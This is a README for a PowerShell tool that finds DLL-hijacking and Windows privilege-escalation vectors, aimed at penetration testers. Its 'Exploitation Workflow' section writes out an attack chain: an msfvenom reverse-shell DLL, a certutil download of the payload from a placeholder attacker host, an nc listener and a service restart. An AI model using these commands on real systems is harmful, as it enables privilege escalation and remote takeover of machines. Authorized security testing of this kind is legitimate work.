# Find-DLLHijack

**Discover DLL hijacking opportunities on Windows — no Procmon required.**

A pure PowerShell tool for penetration testers to identify DLL hijacking vectors in restricted environments where Process Monitor cannot be run (no GUI, limited tooling, AV blocking SysInternals).

---

## The Problem

DLL hijacking is one of the most effective Windows privilege escalation techniques, but discovering hijackable DLLs traditionally requires Procmon — a GUI tool that needs administrative access, often gets flagged by AV/EDR, and doesn't work in headless shell environments.

During a penetration test, you might have a low-privilege shell with no ability to run Procmon. Find-DLLHijack fills that gap.

## What It Checks

| Check | What It Finds |
|-------|---------------|
| **PATH Directory Permissions** | Directories in the system PATH that the current user can write to |
| **Service Binary Directories** | Services running from writable directories (DLL planting) |
| **Unquoted Service Paths** | Services with unquoted paths containing spaces (binary planting) |
| **Writable Service Binaries** | Service executables directly writable by the current user |
| **Process DLL Analysis** | Currently loaded DLLs coming from writable directories |
| **Known Hijackable DLLs** | Well-known DLL names that can be planted in writable PATH directories |
| **Scheduled Task Directories** | Scheduled tasks running from writable directories |
| **DLL Search Order** | SafeDllSearchMode status and KnownDLLs registry analysis |
| **Privilege Check** | Detects SeDebugPrivilege and SeImpersonatePrivilege |

## Quick Start

```powershell
# Load and run:
. .\Find-DLLHijack.ps1
Invoke-DLLHijackScan

# With verbose output:
Invoke-DLLHijackScan -Verbose

# Export results to CSV:
Invoke-DLLHijackScan -ExportCSV results.csv

# Skip slow process analysis:
Invoke-DLLHijackScan -SkipProcesses
```

## Sample Output

```
============================================================
  Find-DLLHijack v1.0 — DLL Hijacking Discovery Tool
  No Procmon Required
============================================================

[*] Running as: corp\web_user
[*] Hostname:   WEB01
[*] Date:       2026-06-01 14:30:22

[*] Checking privileges...
  [!] SeImpersonatePrivilege found — Potato exploits possible!

[*] Checking PATH directories for write access...
  [!] WRITABLE: C:\Program Files\CustomApp\bin

[*] Checking services for DLL hijacking opportunities...
  [!] WRITABLE SERVICE DIR: CustomWebService
      Path: C:\Program Files\CustomApp\bin
      Runs as: LocalSystem

[*] Checking for known hijackable DLLs in writable PATH dirs...
  [!] PLANTABLE: version.dll → C:\Program Files\CustomApp\bin
  [!] PLANTABLE: winhttp.dll → C:\Program Files\CustomApp\bin

============================================================
  SUMMARY
============================================================
  Total findings: 3
    HIGH:     1
    MEDIUM:   2
```

## Exploitation Workflow

After Find-DLLHijack identifies a vector:

```bash
# 1. Generate malicious DLL on your attacker machine:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=4444 -f dll -o hijacked.dll

# 2. Transfer to the writable directory with the expected DLL name:
certutil -urlcache -f http://ATTACKER/hijacked.dll C:\writable\path\version.dll

# 3. Set up listener:
nc -lvnp 4444

# 4. Restart the service (if you have permission) or wait for reboot:
sc stop ServiceName
sc start ServiceName
```

## DLL Search Order Reference

When SafeDllSearchMode is enabled (default):

1. Directory the application loaded from
2. System directory (`C:\Windows\System32`)
3. 16-bit system directory (`C:\Windows\System`)
4. Windows directory (`C:\Windows`)
5. Current directory
6. PATH directories

When SafeDllSearchMode is disabled:

1. Directory the application loaded from
2. **Current directory** ← elevated risk
3. System directory
4. 16-bit system directory
5. Windows directory
6. PATH directories

DLLs listed in `HKLM\System\CurrentControlSet\Control\Session Manager\KnownDLLs` are always loaded from System32 and cannot be hijacked.

## Requirements

- PowerShell 3.0+ (present on Windows 7+ / Server 2012+)
- No admin privileges required (runs in current user context)
- No external dependencies
- No GUI required (works in remote shells)

## Limitations

- Cannot detect DLLs that would be loaded but aren't currently (Procmon's advantage with runtime monitoring)
- Process DLL analysis only covers currently running processes
- Some checks may require elevated privileges for full results (scheduled tasks)
- Known DLL list is curated, not exhaustive — contributions welcome

## Contributing

Found a commonly hijacked DLL that's not in the list? A service that frequently has writable directories? Open a PR or issue.

## License

MIT

## Credits

- Inspired by [PowerUp](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) service enumeration
- [LOLBAS](https://lolbas-project.github.io/) for DLL hijacking research
- [Hijack Libs](https://hijacklibs.net/) for known hijackable DLL database

## See Also

- [Windows Privilege Escalation: Parent PID Spoofing with SeDebugPrivilege](TODO) — companion blog post on another overlooked privesc technique
